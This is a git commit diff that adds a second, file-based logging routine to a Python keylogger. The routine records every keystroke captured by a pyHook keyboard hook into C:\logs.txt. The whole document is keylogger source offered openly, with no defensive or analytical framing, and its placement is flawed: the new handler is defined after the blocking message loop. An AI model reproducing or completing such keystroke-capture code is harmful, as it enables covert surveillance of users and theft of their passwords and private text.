8524eb875dd9c16448d391506d95559f20ea4ee3
Meric BAL <MB@Meric-MacBook-Air.local>
2017-03-02 23:04:03 -0800

    Way 2 added for internal logging.

--- keylogger/logger.py
+++ keylogger/logger.py
@@ -10,3 +10,16 @@ hook_manager = pyHook.HookManager() # new hook manager
 hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
 hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
 pythoncom.PumpMessages() # keep program running in background
+
+
+# way 2 for internal saving 
+
+file_log = 'C:\\logs.txt' # saving file name and location 
+
+def on_keyboard_event(key):
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format="%(message)s")
+	chr(key.Ascii)
+	logging.log(10, chr(key.Ascii))
+	return True
+
+	
